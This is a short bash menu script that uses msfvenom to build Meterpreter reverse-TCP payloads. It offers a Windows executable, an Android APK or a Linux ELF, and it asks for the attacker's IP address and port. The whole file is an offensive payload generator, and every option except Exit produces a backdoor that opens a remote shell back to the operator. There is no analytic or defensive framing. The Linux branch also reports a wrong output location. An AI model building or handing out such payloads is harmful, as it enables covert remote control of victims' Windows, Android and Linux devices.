R="$(printf '\033[1;31m')"
G="$(printf '\033[1;32m')"                                      
Y="$(printf '\033[1;33m')"
W="$(printf '\033[1;37m')"
C="$(printf '\033[1;36m')"

clear

echo ${Y}
figlet " TOOL " 


echo
echo " ${C}[1] Windows "
echo " [2] Android "
echo " [3] Linux "
echo " [4] Exit " ${W}
echo
read -p ${Y}"Select option: "${W} in                    
echo

if [[ $in == 1 ]]; then
clear
echo  ${Y}
figlet EXE 
echo
echo "${G}[I]${Y}  windows/meterpreter/reverse_tcp"
echo  ${C}
read -p " IP  : " ip
echo
read -p " PORT : " port
echo
read -p " name exe :  " name
echo
echo ${G} [I] ${W} building
echo
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe -o /root/Desktop/$name
clear
echo ${G}
echo [I] ${C} /root/Desktop !!
 

elif [[ $in == 2 ]]; then
clear
echo ${Y}
figlet APK
echo
echo "${G}[I]${Y} android/meterpreter/reverse_tcp "
echo ${C}
read -p " IP  : " ip
echo
read -p " PORT : " port
echo
read -p " name apk :  " name
echo
echo ${G} [I] ${W} building
echo
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R >  /root/Desktop/$name
clear
echo ${G}
echo [I] ${C} /root/Desktop !!




elif [[ $in == 3 ]]; then
clear
echo ${Y}
figlet Linux
echo
echo "${G}[I]${Y} linux/x86/meterpreter_reverse_tcp "
echo ${C}
read -p " IP  : " ip                                       echo
read -p " PORT : " port
echo
echo ${G} [I] ${W} building
echo
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > shell-x86.elf
clear                                                 echo ${G}
echo [I] ${C} /root/Desktop !!




elif [[ $in == 4 ]]; then
clear
echo ${C}
echo Thank you !
echo
echo
exit
echo





else
echo ${R}
clear
echo  ERROR  ${W}
echo
read -p " Press any key to continue .....  "
echo
./run.sh









fi
